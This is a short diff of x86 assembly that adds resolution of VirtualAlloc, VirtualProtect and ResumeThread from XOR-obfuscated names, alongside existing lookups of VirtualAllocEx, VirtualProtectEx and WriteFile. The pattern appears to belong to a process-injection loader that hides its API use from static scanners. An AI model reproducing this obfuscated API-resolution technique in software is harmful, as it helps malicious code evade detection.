@@ -1016,6 +1016,14 @@ populate_kernel_function_ptrs_by_name:
     mov [write_file], eax                       ; WriteFile addr
 
     push dword 0
+    push dword virtual_alloc_xor.len
+    push dword virtual_alloc_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [virtual_alloc], eax                    ; VirtualAlloc addr
+
+    push dword 0
     push dword virtual_alloc_ex_xor.len
     push dword virtual_alloc_ex_xor
     push dword [ebp + 8]
@@ -1030,6 +1038,14 @@ populate_kernel_function_ptrs_by_name:
     call unxor_and_get_proc_addr                ; proc addr
 
     mov [virtual_free_ex], eax                  ; VirtualFreeEx addr
+
+    push dword 0
+    push dword virtual_protect_xor.len
+    push dword virtual_protect_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [virtual_protect], eax                  ; VirtualProtect addr
 
     push dword 0
     push dword virtual_protect_ex_xor.len
@@ -1110,6 +1126,14 @@ populate_kernel_function_ptrs_by_name:
     call unxor_and_get_proc_addr                ; proc addr
 
     mov [sleep], eax                            ; Sleep addr
+
+    push dword 0
+    push dword resume_thread_xor.len
+    push dword resume_thread_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [resume_thread], eax                    ; ResumeThread addr
 
     push dword 0
     push dword output_debug_string_a_xor.len
